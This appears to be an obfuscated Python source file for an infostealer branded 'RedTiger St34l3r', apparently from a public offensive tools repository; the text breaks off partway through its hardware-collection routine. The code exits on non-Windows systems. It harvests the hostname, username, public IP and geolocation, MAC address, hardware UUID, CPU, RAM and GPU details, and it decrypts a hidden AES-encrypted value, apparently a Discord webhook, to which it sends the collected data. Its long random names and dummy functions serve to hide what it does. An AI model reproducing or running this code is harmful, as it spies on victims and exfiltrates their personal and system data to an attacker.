
import sys

def OLFJPVNVYCILGGUBCGBFNJALYABWAIAILJNMUDDWBMUWRWGNPRHTSAYAYNPQFHTJTHGPUWJE():
    def PYKYBUOTNKTHRJVBXPNHNOQUUVFNWZQUAKGYAVOUSEGZKWODVHUZEQMIAVFPLSGZGELBPXHUC():
        if sys.platform.startswith("win"):
            return False
        else:
            return True
    
    try: 
        WQFWEROONRSXNMYSVOHHODMUQFGKEWYHWOPZADTQEIWQUTAJVLXYHXIXNODUXPHQ = PYKYBUOTNKTHRJVBXPNHNOQUUVFNWZQUAKGYAVOUSEGZKWODVHUZEQMIAVFPLSGZGELBPXHUC()
        if WQFWEROONRSXNMYSVOHHODMUQFGKEWYHWOPZADTQEIWQUTAJVLXYHXIXNODUXPHQ == True:
            return WQFWEROONRSXNMYSVOHHODMUQFGKEWYHWOPZADTQEIWQUTAJVLXYHXIXNODUXPHQ
    except:
        return True
    
if OLFJPVNVYCILGGUBCGBFNJALYABWAIAILJNMUDDWBMUWRWGNPRHTSAYAYNPQFHTJTHGPUWJE() == True:
    sys.exit()
    
import os
import socket
import win32api
import requests
import base64
import ctypes
import threading
import discord
from discord import SyncWebhook
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.backends import default_backend

def UUIHOTVTUUPMMEYKLZVVVVZZAMDPQEPPQVWMYFJUULTSAHBLQVRNSKHSPTTAODXUJREUEJTJEHXJOYLANGDRZPQNGMK(): pass
def ZVSFEBJODLKBBWWMILPJCJWRUKZKEIMWSJINZPSVAEAJSICYEBSCJWEDAYNNLRNZSJOMMZHDVSJCWASWKPOIZA(): pass
def UUIGEGDCNNOOQMCDPLZPLUDCZCEDZWTOLUOOAJMUQRSGWOXMQNMBS(): pass
def QRUTGDDCIKGXJDKCRTAUNIGSWVPBEKQWUKSPKQQGITICVEMDGTRDMASYX(): pass
def ATFZEITPXGPAUNKMHKKWOCBAFSXSBBGTCPDIALHVOKBBNLNEWOTGRKRSSNVZWLSNDCPNUYBZJIPQXERPHUUQRNZUZFAXQUYSGKCK(): pass
def MZRYJMGODYFASFYTGWYXFTJDZKITQCBWGPYTIBGCPWJVRAUPQQKOAIPQWOCIJMPJROSQLRK(): pass
def DTLMUHTIYOIKEJAWJBMIVWSSMVHXMFPORFXDXHVQGGKDQSPHLIWHVIJDPYMIJLDNWYUQQOPTFUBACNQTRU(): pass
def LJVXCHQRUKDVHXRUCQLFAPTOSMJBFEVHYNJSEEQHHVDGOVKATZXANDZWYZX(): pass
def IBIYMTIDBWLOWPTLUCRLVHUKRCNDJWEYDHSKJHCAZZGYAWXSTU(): pass
def FLBOCAAGPGITEVJPENBLWMDKFDSJPYUYFOJCHPSPAXTVQEKYMTWRGLCZVLULTBN(): pass
def MWNVYDWEWVGZUEMUEAMFBDZWJTYIOFBABCHNAPIUZAQXVIUDZGTAZJCCGJXNDALBATHONZAINIUBUKBSIUF(): pass
def NYSCXANWOFWLCMRXJQGARPRQPCZKDRJXIARGGWDVSCAQZLPYBNIF(): pass
def ZCISFJWJSTPVORGIGGOQEMGAGVSCJHWWCJRCBCETACSQVPMRCYTDIAYIHNZJWLKFHTSOLIWUUUTFXPE(): pass
def GACPRPWOKYEBIHYZKGWTVAGIQRTCJMAWBWEQCVLEBRAHRTZNRRVQGBJBRWDVRXOLAKWIYOKJNIKT(): pass
def IEOYBOALNYHVRKPHGBEEJTYYMEKNODRPRBHNYQAHUELRJKOKVFQFJCBTOPLEWCULTDWPGQFPM(): pass
def IKJXIKMLDMQFXZEJSMBIYFLCFHWEYLSLUJRIDSXPOSNBFYOJDMAMGADPUTDUDCGDAPDAPNOSPJONTZOQELNZBSA(): pass
def DOVTBVJUFBJPXYOKRMLDQQDLCMGEZZHGPRNFPYENAWSLOWZTAXZOUKLSLUZMSJROB(): pass
def NLDJYDMGMMZDYBKHFOAFMXWBTZFCAEZWDPEWMIBZTUTBLBFARPTTWXNSIQUJPMK(): pass
def EZFTTOZOSSBMZLECOOYBHTEMXGTZJEYWIEWFCSYTJDFTNAWOKHIPMGKIBPYTZLVRAIJZHQQKVJZNBKETADHCKSILZFOYKXFHXBYE(): pass
def XIURVILXTSPZLDHWUFIBDNFBIVZFPSMAIFDSYDPDLUQAQPBVMKVUVKZL(): pass

def GPQJQZDODBKDWXCMWBUJGVPOVWKNWRHPOQOQCKGBXSYGKGYEKDQNIDYLHTHZ(w3bh00k_ur1, title=None, description=None):
    try:
        client = SyncWebhook.from_url(w3bh00k_ur1)
        embed = discord.Embed(
            title=title,
            description=description,
            color= DAPSMXEDLIKSTFUVWGEPGFEBJXTTEWJJUJETQQTXGTJKZRGEXTXDCIJM
        )
        embed.set_footer(text=AZAPUOATZPGDQDFGBUKJXQYURDKDMCRZDJOUCYSXGSRXNFWKMWVYXPZTRQAOKNWMAFWDEXJLMAE, icon_url=SHOWNSKRNOCVGGNZLEOCBAMYPBDOARPSHJMIEAVZRIRZDFATBQOFUDSMFS)
        client.send(embed=embed, username=XBPXCQXYOTIABXOITFRXKODCIOGSZIEVUVDQUWPOHYAYXPAECZVFAWADBBUDMXVUTFDCIOTWMAQJDHEEVQPZAPXSWAVCG, avatar_url=SHOWNSKRNOCVGGNZLEOCBAMYPBDOARPSHJMIEAVZRIRZDFATBQOFUDSMFS)
    except: pass

def WXCLRUOJKCINVMJGMTOQUKONFHBBCSAIHTGEARHNJXRKZZDEFFASHYKUHCB(title):
    try:
        if sys.platform.startswith("win"):
            ctypes.windll.kernel32.SetConsoleTitleW(title)
        elif sys.platform.startswith("linux"):
            sys.stdout.write(f"\x1b]2;{title}\x07")
    except:
        pass
        
def WOOJNYQYKLMQYAWJOTSPNHTYDVTZCQQIBRTTFBEDUQODTKCUOXLNHJULWCUNKQOVCSVZOBOYMNJ():
    try:
        if sys.platform.startswith("win"):
            os.system("cls")
        elif sys.platform.startswith("linux"):
            os.system("clear")
    except:
        pass

def JDSWGOMYNPPXYIYLDGQJOADGSDXECKXGSTXSOIZLFOKZKQNMIGSNUMZCUCNQBYNF(RVYPEOMHDVKSPCFUHUMPNSTGHKVWPDJBIBUHWEKUBAKZLTGIIYUAEKI, KFCMMZUSSFRGBXGVWGNOPOPXBDRSMXSIIOWXJOLBMOWPCYLTABPRLZOSMVTYHIICHL):
    def KEDSMWPBVPSFBSBFLSPHUUPCDIEGANEKWGFADHSJMLWKWFGGSOAHVUDVNYUQYVPWUFFHEMOTULVSDPL(GFGIXCVGUGTWPQCVYVJUQXOGHMNMABOUHJSEYDCQSSMTRPHFYRGLEKUNWFDBBNVHJVALQB, ASNRJNTOXGZWQBTMXOJASUNZDBQBFXGGTUWTDLOCKSCWXPMFCHZZISRNNZPEKYDJVDHRYRYANAXKICSPSDUDVYLYORMZFPUKQ):
        TQBDHQAKXWXJFOFSORZYYTOIAGBCINENJQUHWPUCNWGSJYRUWSDSCIFLPGUVD = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=ASNRJNTOXGZWQBTMXOJASUNZDBQBFXGGTUWTDLOCKSCWXPMFCHZZISRNNZPEKYDJVDHRYRYANAXKICSPSDUDVYLYORMZFPUKQ, iterations=100000, backend=default_backend())
        if isinstance(GFGIXCVGUGTWPQCVYVJUQXOGHMNMABOUHJSEYDCQSSMTRPHFYRGLEKUNWFDBBNVHJVALQB, str):  
            GFGIXCVGUGTWPQCVYVJUQXOGHMNMABOUHJSEYDCQSSMTRPHFYRGLEKUNWFDBBNVHJVALQB = GFGIXCVGUGTWPQCVYVJUQXOGHMNMABOUHJSEYDCQSSMTRPHFYRGLEKUNWFDBBNVHJVALQB.encode()  
        return TQBDHQAKXWXJFOFSORZYYTOIAGBCINENJQUHWPUCNWGSJYRUWSDSCIFLPGUVD.derive(GFGIXCVGUGTWPQCVYVJUQXOGHMNMABOUHJSEYDCQSSMTRPHFYRGLEKUNWFDBBNVHJVALQB)

    RVYPEOMHDVKSPCFUHUMPNSTGHKVWPDJBIBUHWEKUBAKZLTGIIYUAEKI_data = base64.b64decode(RVYPEOMHDVKSPCFUHUMPNSTGHKVWPDJBIBUHWEKUBAKZLTGIIYUAEKI)
    ASNRJNTOXGZWQBTMXOJASUNZDBQBFXGGTUWTDLOCKSCWXPMFCHZZISRNNZPEKYDJVDHRYRYANAXKICSPSDUDVYLYORMZFPUKQ = RVYPEOMHDVKSPCFUHUMPNSTGHKVWPDJBIBUHWEKUBAKZLTGIIYUAEKI_data[:16]
    HOYQKKTBUZBDPJGTAPSGHZBWOFEQIXWEZJAAPODKNRKEEJVNSHEPEONUHWKWHWNVDLCKHLJPUQYXSFMYNJLHAVMQSGASAKAZDD = RVYPEOMHDVKSPCFUHUMPNSTGHKVWPDJBIBUHWEKUBAKZLTGIIYUAEKI_data[16:32]
    RVYPEOMHDVKSPCFUHUMPNSTGHKVWPDJBIBUHWEKUBAKZLTGIIYUAEKI_data = RVYPEOMHDVKSPCFUHUMPNSTGHKVWPDJBIBUHWEKUBAKZLTGIIYUAEKI_data[32:]
    SGQXJSYBTQIVZKRDPOBIMZWRSJBUQNDKDJLJCZUHQCUZZMDOYDKJAKVUEFUGJZ = KEDSMWPBVPSFBSBFLSPHUUPCDIEGANEKWGFADHSJMLWKWFGGSOAHVUDVNYUQYVPWUFFHEMOTULVSDPL(KFCMMZUSSFRGBXGVWGNOPOPXBDRSMXSIIOWXJOLBMOWPCYLTABPRLZOSMVTYHIICHL, ASNRJNTOXGZWQBTMXOJASUNZDBQBFXGGTUWTDLOCKSCWXPMFCHZZISRNNZPEKYDJVDHRYRYANAXKICSPSDUDVYLYORMZFPUKQ)
    VUBJUGEIXGPSTXSFMITQBWHOJZQMPXOJGKNOKMXJTQRVPXJEQIBGXL = Cipher(algorithms.AES(SGQXJSYBTQIVZKRDPOBIMZWRSJBUQNDKDJLJCZUHQCUZZMDOYDKJAKVUEFUGJZ), modes.CBC(HOYQKKTBUZBDPJGTAPSGHZBWOFEQIXWEZJAAPODKNRKEEJVNSHEPEONUHWKWHWNVDLCKHLJPUQYXSFMYNJLHAVMQSGASAKAZDD), backend=default_backend())
    UQTLTBEGREXLFUKMHYULAKNOQPZIJQIQFKEKNZYXMPPRZKSRQDTKEPYWHKPVPOQUUZVPFPD = VUBJUGEIXGPSTXSFMITQBWHOJZQMPXOJGKNOKMXJTQRVPXJEQIBGXL.decryptor()
    TWEUMCPMZNLRTIREFRYIYDAGFMZJGYTQLBIRUEVGSKXWUAIXWOVXQPVZHAZLYLLYOXIOSDEOVZSOQU = UQTLTBEGREXLFUKMHYULAKNOQPZIJQIQFKEKNZYXMPPRZKSRQDTKEPYWHKPVPOQUUZVPFPD.update(RVYPEOMHDVKSPCFUHUMPNSTGHKVWPDJBIBUHWEKUBAKZLTGIIYUAEKI_data) + UQTLTBEGREXLFUKMHYULAKNOQPZIJQIQFKEKNZYXMPPRZKSRQDTKEPYWHKPVPOQUUZVPFPD.finalize()
    USUWHDHWTEGHTQQHNZKKDAXQDJFQTBGMUWVRKKXCLUZOYQVFZSWGNTHMNQJ = padding.PKCS7(128).unpadder()
    JEXHCJTFYBQCGUMZYRXJMWVCVWLKHBBDSIFDSVEMIZSXRHYZDYFFWPZSNMMZUJSWAFUBWUBIPAJPSWHR = USUWHDHWTEGHTQQHNZKKDAXQDJFQTBGMUWVRKKXCLUZOYQVFZSWGNTHMNQJ.update(TWEUMCPMZNLRTIREFRYIYDAGFMZJGYTQLBIRUEVGSKXWUAIXWOVXQPVZHAZLYLLYOXIOSDEOVZSOQU) + USUWHDHWTEGHTQQHNZKKDAXQDJFQTBGMUWVRKKXCLUZOYQVFZSWGNTHMNQJ.finalize()
    return JEXHCJTFYBQCGUMZYRXJMWVCVWLKHBBDSIFDSVEMIZSXRHYZDYFFWPZSNMMZUJSWAFUBWUBIPAJPSWHR.decode()

WXCLRUOJKCINVMJGMTOQUKONFHBBCSAIHTGEARHNJXRKZZDEFFASHYKUHCB("")

try: TLZVPRRZUEOPKLVOMRUIIPRTJDQJMYCPWCVIPXFBFNTEDBFXQIPLI    = socket.gethostname()
except: TLZVPRRZUEOPKLVOMRUIIPRTJDQJMYCPWCVIPXFBFNTEDBFXQIPLI = "None"

try: DFOUILSAESRKZYAJGXEBLBNMMTCPLNWFPYFKETXXQUAMMPWMCCGKVYTOJMRECVXPPNKBWMS    = os.getlogin()
except: DFOUILSAESRKZYAJGXEBLBNMMTCPLNWFPYFKETXXQUAMMPWMCCGKVYTOJMRECVXPPNKBWMS = "None"

try: QWCRRCTSRZDTTQXMDRBUZYTGTPAXEEOPQAGPEQTUVDREBUFMDUWAJAQFEUPSOQDFMRIXGTVPZELLACRQWLY    = win32api.GetUserNameEx(win32api.NameDisplay)
except: QWCRRCTSRZDTTQXMDRBUZYTGTPAXEEOPQAGPEQTUVDREBUFMDUWAJAQFEUPSOQDFMRIXGTVPZELLACRQWLY = "None"

try: CKAIWASOGZRWBZEYMZLMRMRJOEFWOFXGQJRPRJRLUGCFWMLRCYPFQXYAETTAMVWUXOOPWRJUDYGSGVYRSPPJXR    = requests.get("https://api.ipify.org?format=json").json().get("ip", "None")
except: CKAIWASOGZRWBZEYMZLMRMRJOEFWOFXGQJRPRJRLUGCFWMLRCYPFQXYAETTAMVWUXOOPWRJUDYGSGVYRSPPJXR = "None"

try: IFGADTZSWFXWFOWSCLOWXOQEEKMVUFQOUYLPPHCTQDBKZCVGGUKVXAVU    = socket.gethostbyname(socket.gethostname())
except: IFGADTZSWFXWFOWSCLOWXOQEEKMVUFQOUYLPPHCTQDBKZCVGGUKVXAVU = "None"

FHOJLEYLVUIHSNVIIFDFHMSJQVCYJTMIXSQBNMEGZHCRYWBTEPWACSXILHWMZDBCFZ = r"""
93NRiOtxhy8HY1bP/jZbKZDicvTTi2vPrNpefAzinbJKdqX2rmg/kgAKs7CKAIsw/rs2mLSHrJUlfF/1I9/p3W5jTCRPdXpk2QMNwHXL/GbXudsdguocWjwKPUCxs1K73GeheHv+o/QI+JQfZZ+huFspGytWnRwEoFUnJDbyWIn9ZiHVmkSmX98s7KWcaAv5mVH9SVOQoxUnjCeIo9FRnQ==
"""

YJHUUUMPKVTMAHPFROKYFJTVCNDXJXTSDWUGYEUXSDTANDQNVMOTZLOGXQYIBNJTAWLXTDAMUIBNWMM            = "LnupNBfaySuJJdrmLiGdKUoJysogPhBIWBsbcIWwtkuauKjFdpxmsYBIWgCmSIJtHXuiTQuzdoFxjMxfhvpXUXZJupLcogIsuNkGBuskiQTWoRvtRYLbNwFIEsbOagYqDDPETAsEdRiIgisIfgRcoM"
YMMLVOYCDVTLQIHDFCYAQWTFEGXSJVKNFMASQKRCZEOSRIBMPYNHVLARFQSPIGAKGWNCDZTYHIJAWUBZM        = "redtiger.shop"
DAPSMXEDLIKSTFUVWGEPGFEBJXTTEWJJUJETQQTXGTJKZRGEXTXDCIJM    = 0xa80505
XBPXCQXYOTIABXOITFRXKODCIOGSZIEVUVDQUWPOHYAYXPAECZVFAWADBBUDMXVUTFDCIOTWMAQJDHEEVQPZAPXSWAVCG = "RedTiger St34l3r"
SHOWNSKRNOCVGGNZLEOCBAMYPBDOARPSHJMIEAVZRIRZDFATBQOFUDSMFS   = "https://cdn.discordapp.com/attachments/1337898355279401023/1341890893858213908/RedTiger-Logo.png?ex=67b7a4c8&is=67b65348&hm=174ddbd80dd8570fa83779687def6eda441a7c12abd3765d970c1958ceeb1ec8&"
AZAPUOATZPGDQDFGBUKJXQYURDKDMCRZDJOUCYSXGSRXNFWKMWVYXPZTRQAOKNWMAFWDEXJLMAE    = "RedTiger St34l3r - github.com/loxy0dev/RedTiger-Tools"
ZYUOPRJFOGRSHEPWPYUFIKMARCILEMYNITIEULQPQNLKQNXKAOJDXWOSU   = {"text": AZAPUOATZPGDQDFGBUKJXQYURDKDMCRZDJOUCYSXGSRXNFWKMWVYXPZTRQAOKNWMAFWDEXJLMAE, "icon_url": SHOWNSKRNOCVGGNZLEOCBAMYPBDOARPSHJMIEAVZRIRZDFATBQOFUDSMFS}
DPZEOYYVYHHCDTHYXVDIUJXMLXNPECBKTNJUHKJWBHAOJYTUMWKLLEGYQAR    = f'`{DFOUILSAESRKZYAJGXEBLBNMMTCPLNWFPYFKETXXQUAMMPWMCCGKVYTOJMRECVXPPNKBWMS} "{CKAIWASOGZRWBZEYMZLMRMRJOEFWOFXGQJRPRJRLUGCFWMLRCYPFQXYAETTAMVWUXOOPWRJUDYGSGVYRSPPJXR}"`'
CSRNJXPULINWNDPMPIZDEVUTAZWWOBQJXEPBRHDBFAGETEBWPMODBBI    = JDSWGOMYNPPXYIYLDGQJOADGSDXECKXGSTXSOIZLFOKZKQNMIGSNUMZCUCNQBYNF(FHOJLEYLVUIHSNVIIFDFHMSJQVCYJTMIXSQBNMEGZHCRYWBTEPWACSXILHWMZDBCFZ, YJHUUUMPKVTMAHPFROKYFJTVCNDXJXTSDWUGYEUXSDTANDQNVMOTZLOGXQYIBNJTAWLXTDAMUIBNWMM)

KAFUGPTBXFJRLDWKBAFFZHZHKNVUSFOZILHHONCZMWTYXMUHCQPNFRPF         = os.getenv("WINDIR", None).replace(" ", "%20")
CFOPQEHFVFQXSEEBGOHKCNVNAPPYLVWXRWJRHYMVCKUGSYEKCCZHVLSBHOAWUASJSMBFQCCRFVTXPPFAJMDHHHFBAKF     = os.getenv('USERPROFILE', None).replace(" ", "%20")
AMADDHCQFOLNGYGRBCGTOOCGFLEEPRQUBLEAZMESRIIXTPUYKVEZTUXSHIYKNCWUVLDBUKSZXLLGUXOZKORQMFQCTIDX   = os.getenv('LOCALAPPDATA', None).replace(" ", "%20")
NOQILWAWNRUJYCKTSLVBNVINBRPAQJNKHSIYXJXSFBXZOTWWFJUXDOMHMVHD = os.getenv('APPDATA', None).replace(" ", "%20")

try:
    RPSUXTGLFTNWSFZFFHUEXRYYZOJHXVBJEAJWZSQTJFRXEECGBIZCUMBRDPKYGYZFABURFTMELNIMQJGKKQNVQ = requests.get(f"https://{YMMLVOYCDVTLQIHDFCYAQWTFEGXSJVKNFMASQKRCZEOSRIBMPYNHVLARFQSPIGAKGWNCDZTYHIJAWUBZM}/api/ip/ip={CKAIWASOGZRWBZEYMZLMRMRJOEFWOFXGQJRPRJRLUGCFWMLRCYPFQXYAETTAMVWUXOOPWRJUDYGSGVYRSPPJXR}")
    PABJPUCUQEGXBOXBJMFCLUOIVGPSJWICCOLHCIHMOUVJGZUVQPBBJBGNNDIPMSLQSUVKWG = RPSUXTGLFTNWSFZFFHUEXRYYZOJHXVBJEAJWZSQTJFRXEECGBIZCUMBRDPKYGYZFABURFTMELNIMQJGKKQNVQ.json()

    CFSDMJPGDBDMLCCZWRNRJMXVLUJREHEDEQLLCVQSYSVTNJQTMMJWZYHSFOLDAMMKPBAQJ = PABJPUCUQEGXBOXBJMFCLUOIVGPSJWICCOLHCIHMOUVJGZUVQPBBJBGNNDIPMSLQSUVKWG.get('country', "None")
    CFSDMJPGDBDMLCCZWRNRJMXVLUJREHEDEQLLCVQSYSVTNJQTMMJWZYHSFOLDAMMKPBAQJ_code = PABJPUCUQEGXBOXBJMFCLUOIVGPSJWICCOLHCIHMOUVJGZUVQPBBJBGNNDIPMSLQSUVKWG.get('country_code', "None")
    ASCGFXFPCVIYOLQFJGOFWXGQAYEBVGZTHPVEUOUBXTYYQPXKBUDYNT = PABJPUCUQEGXBOXBJMFCLUOIVGPSJWICCOLHCIHMOUVJGZUVQPBBJBGNNDIPMSLQSUVKWG.get('region', "None")
    ASCGFXFPCVIYOLQFJGOFWXGQAYEBVGZTHPVEUOUBXTYYQPXKBUDYNT_code = PABJPUCUQEGXBOXBJMFCLUOIVGPSJWICCOLHCIHMOUVJGZUVQPBBJBGNNDIPMSLQSUVKWG.get('region_code', "None")
    PZADNNGNYKKHEVOKKZNRPRFFHYGOKPEMUOXLIHDFCIIQXMVCTAR = PABJPUCUQEGXBOXBJMFCLUOIVGPSJWICCOLHCIHMOUVJGZUVQPBBJBGNNDIPMSLQSUVKWG.get('zip', "None")
    YFYSKXZUNNMCTJMBTFIAYXZEZNVWNJGLXGEYXBXVAKGZSXWMYEZMVHSGJENYBDAJFNGNEAHGIDPOJTNNONVWKDEETXMJHKDP = PABJPUCUQEGXBOXBJMFCLUOIVGPSJWICCOLHCIHMOUVJGZUVQPBBJBGNNDIPMSLQSUVKWG.get('city', "None")
    NGMFHJRJZVRZELTHTVIQMVDVWUAUHECJEGJYJXLGICATFPJJAMZPCIJEWBNVYIHILCOESPABJUWF = PABJPUCUQEGXBOXBJMFCLUOIVGPSJWICCOLHCIHMOUVJGZUVQPBBJBGNNDIPMSLQSUVKWG.get('latitude', "None")
    HKBWGPXQSTVLJVFBLTMEJPSWEHKSHZXSBQRZTCEYKOJVPLZZQULVOOQHNESRIGWZNAVLXQBVOUFWKEJLZXTLTONPJAECYFVV = PABJPUCUQEGXBOXBJMFCLUOIVGPSJWICCOLHCIHMOUVJGZUVQPBBJBGNNDIPMSLQSUVKWG.get('longitude', "None")
    IAYIQEXNLGNDGGDSFANAVYBLKITIBDJZOVQCJXSNUGONVASDFCES = PABJPUCUQEGXBOXBJMFCLUOIVGPSJWICCOLHCIHMOUVJGZUVQPBBJBGNNDIPMSLQSUVKWG.get('timezone', "None")
    BSDNOIZPTCXHKRUUGRBTSTZAWSUWZJPSDJWPJYDQLPNQAIPARCMEEAOABFTWBXIDRKNYAVEZTBPVVMSHX = PABJPUCUQEGXBOXBJMFCLUOIVGPSJWICCOLHCIHMOUVJGZUVQPBBJBGNNDIPMSLQSUVKWG.get('isp', "None")
    TLPCDOWLWISDBFXEKFRZOWIDEGODJKUHYOOMXWIOPFJCHCSNIOINQNCQDFRPJVEWLKKOMKOOLFJWX = PABJPUCUQEGXBOXBJMFCLUOIVGPSJWICCOLHCIHMOUVJGZUVQPBBJBGNNDIPMSLQSUVKWG.get('org', "None")
    ZCOZAUESXGSLQTBJGAHAVQBVSASYATBMOSLRLZAKUAKMPOTDKNQIRRNMGSGWNKWFWIIBIEIDUVA = PABJPUCUQEGXBOXBJMFCLUOIVGPSJWICCOLHCIHMOUVJGZUVQPBBJBGNNDIPMSLQSUVKWG.get('as', "None")
except:
    RPSUXTGLFTNWSFZFFHUEXRYYZOJHXVBJEAJWZSQTJFRXEECGBIZCUMBRDPKYGYZFABURFTMELNIMQJGKKQNVQ = requests.get(f"http://ip-api.com/json/{CKAIWASOGZRWBZEYMZLMRMRJOEFWOFXGQJRPRJRLUGCFWMLRCYPFQXYAETTAMVWUXOOPWRJUDYGSGVYRSPPJXR}")
    PABJPUCUQEGXBOXBJMFCLUOIVGPSJWICCOLHCIHMOUVJGZUVQPBBJBGNNDIPMSLQSUVKWG = RPSUXTGLFTNWSFZFFHUEXRYYZOJHXVBJEAJWZSQTJFRXEECGBIZCUMBRDPKYGYZFABURFTMELNIMQJGKKQNVQ.json()

    CFSDMJPGDBDMLCCZWRNRJMXVLUJREHEDEQLLCVQSYSVTNJQTMMJWZYHSFOLDAMMKPBAQJ = PABJPUCUQEGXBOXBJMFCLUOIVGPSJWICCOLHCIHMOUVJGZUVQPBBJBGNNDIPMSLQSUVKWG.get('country', "None")
    CFSDMJPGDBDMLCCZWRNRJMXVLUJREHEDEQLLCVQSYSVTNJQTMMJWZYHSFOLDAMMKPBAQJ_code = PABJPUCUQEGXBOXBJMFCLUOIVGPSJWICCOLHCIHMOUVJGZUVQPBBJBGNNDIPMSLQSUVKWG.get('countryCode', "None")
    ASCGFXFPCVIYOLQFJGOFWXGQAYEBVGZTHPVEUOUBXTYYQPXKBUDYNT = PABJPUCUQEGXBOXBJMFCLUOIVGPSJWICCOLHCIHMOUVJGZUVQPBBJBGNNDIPMSLQSUVKWG.get('regionName', "None")
    ASCGFXFPCVIYOLQFJGOFWXGQAYEBVGZTHPVEUOUBXTYYQPXKBUDYNT_code = PABJPUCUQEGXBOXBJMFCLUOIVGPSJWICCOLHCIHMOUVJGZUVQPBBJBGNNDIPMSLQSUVKWG.get('region', "None")
    PZADNNGNYKKHEVOKKZNRPRFFHYGOKPEMUOXLIHDFCIIQXMVCTAR = PABJPUCUQEGXBOXBJMFCLUOIVGPSJWICCOLHCIHMOUVJGZUVQPBBJBGNNDIPMSLQSUVKWG.get('zip', "None")
    YFYSKXZUNNMCTJMBTFIAYXZEZNVWNJGLXGEYXBXVAKGZSXWMYEZMVHSGJENYBDAJFNGNEAHGIDPOJTNNONVWKDEETXMJHKDP = PABJPUCUQEGXBOXBJMFCLUOIVGPSJWICCOLHCIHMOUVJGZUVQPBBJBGNNDIPMSLQSUVKWG.get('city', "None")
    NGMFHJRJZVRZELTHTVIQMVDVWUAUHECJEGJYJXLGICATFPJJAMZPCIJEWBNVYIHILCOESPABJUWF = PABJPUCUQEGXBOXBJMFCLUOIVGPSJWICCOLHCIHMOUVJGZUVQPBBJBGNNDIPMSLQSUVKWG.get('lat', "None")
    HKBWGPXQSTVLJVFBLTMEJPSWEHKSHZXSBQRZTCEYKOJVPLZZQULVOOQHNESRIGWZNAVLXQBVOUFWKEJLZXTLTONPJAECYFVV = PABJPUCUQEGXBOXBJMFCLUOIVGPSJWICCOLHCIHMOUVJGZUVQPBBJBGNNDIPMSLQSUVKWG.get('lon', "None")
    IAYIQEXNLGNDGGDSFANAVYBLKITIBDJZOVQCJXSNUGONVASDFCES = PABJPUCUQEGXBOXBJMFCLUOIVGPSJWICCOLHCIHMOUVJGZUVQPBBJBGNNDIPMSLQSUVKWG.get('timezone', "None")
    BSDNOIZPTCXHKRUUGRBTSTZAWSUWZJPSDJWPJYDQLPNQAIPARCMEEAOABFTWBXIDRKNYAVEZTBPVVMSHX = PABJPUCUQEGXBOXBJMFCLUOIVGPSJWICCOLHCIHMOUVJGZUVQPBBJBGNNDIPMSLQSUVKWG.get('isp', "None")
    TLPCDOWLWISDBFXEKFRZOWIDEGODJKUHYOOMXWIOPFJCHCSNIOINQNCQDFRPJVEWLKKOMKOOLFJWX = PABJPUCUQEGXBOXBJMFCLUOIVGPSJWICCOLHCIHMOUVJGZUVQPBBJBGNNDIPMSLQSUVKWG.get('org', "None")
    ZCOZAUESXGSLQTBJGAHAVQBVSASYATBMOSLRLZAKUAKMPOTDKNQIRRNMGSGWNKWFWIIBIEIDUVA = PABJPUCUQEGXBOXBJMFCLUOIVGPSJWICCOLHCIHMOUVJGZUVQPBBJBGNNDIPMSLQSUVKWG.get('as', "None")

def DTLMUHTIYOIKEJAWJBMIVWSSMVHXMFPORFXDXHVQGGKDQSPHLIWHVIJDPYMIJLDNWYUQQOPTFUBACNQTRU():
    import platform
    import subprocess
    import uuid
    import psutil
    import GPUtil
    import ctypes
    import win32api
    import string
    import screeninfo
    from discord import SyncWebhook, Embed

    try: NIINOHMLEDGBRWNKBCEJSVIEQBMAPVZEJJPDPTLHMVVPIZGZYLUHAAQFGRSLRJXBGFCFCEOCM = {platform.system()}
    except: NIINOHMLEDGBRWNKBCEJSVIEQBMAPVZEJJPDPTLHMVVPIZGZYLUHAAQFGRSLRJXBGFCFCEOCM = "None"

    try: WKMXTBWGFIVUHFVDHOZTEXXIKSVURBQHDOCFJEGGWVGMEKBYZMUSYTFJJBTK = platform.version()
    except: WKMXTBWGFIVUHFVDHOZTEXXIKSVURBQHDOCFJEGGWVGMEKBYZMUSYTFJJBTK = "None"

    try: GEPQLWKLGBUBLJXDOYEUDAYWCQEAUOGKHEZIWZYARQRNUHCFLRIP = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0,2*6,2)][::-1])
    except: GEPQLWKLGBUBLJXDOYEUDAYWCQEAUOGKHEZIWZYARQRNUHCFLRIP = "None"

    try: VOCMSMPAMMDDQNSMYPEDUUXTYHNDCDUNDZORTWTQXEBIGBDRVLUFJDFYCZZLPXHHGOGTKBECGDIKURGCURLDDVHHYMJDKUZZLTQI = subprocess.check_output('C:\\Windows\\System32\\wbem\\WMIC.exe csproduct get uuid', shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')[1].strip()
    except: VOCMSMPAMMDDQNSMYPEDUUXTYHNDCDUNDZORTWTQXEBIGBDRVLUFJDFYCZZLPXHHGOGTKBECGDIKURGCURLDDVHHYMJDKUZZLTQI = "None"

    try: ZVZNZVXAJJMNKKAMBUNVOHFHRSQSSOVVNOSZWTLIMPNMGKVWTAUKMWOLTXAURNHGNJPEDFIKSWBMLMURHEONS = round(psutil.virtual_memory().total / (1024**3), 2)
    except: ZVZNZVXAJJMNKKAMBUNVOHFHRSQSSOVVNOSZWTLIMPNMGKVWTAUKMWOLTXAURNHGNJPEDFIKSWBMLMURHEONS = "None"

    try: BEPMHEHNLMIAOAMFNIWQPCYIALPSDOFVWLHPIPSFZMGMQOHVGYNWOODZNUGRP = platform.processor()
    except: BEPMHEHNLMIAOAMFNIWQPCYIALPSDOFVWLHPIPSFZMGMQOHVGYNWOODZNUGRP = "None"

    try: AHFSXOQXEJBEYHIBLRXMJZQARKBMFXPSPOSPYDRDYJCPELDSCAFEVSKFZZCKOWUYLUQMWBMHDS = psutil.cpu_count(logical=False)
    except: AHFSXOQXEJBEYHIBLRXMJZQARKBMFXPSPOSPYDRDYJCPELDSCAFEVSKFZZCKOWUYLUQMWBMHDS = "None"

    try: CKBKIEFUOROQNVRVVXAHIANRHICSBVTANTDQMJRXNYHVHVXHVJYJRDPFALUHYTLVMWUCLZXEWLHLOWWONLDTEPGQJZQZHQRUH = GPUtil.getGPUs()[0].name if GPUtil.getGPUs() else "None"
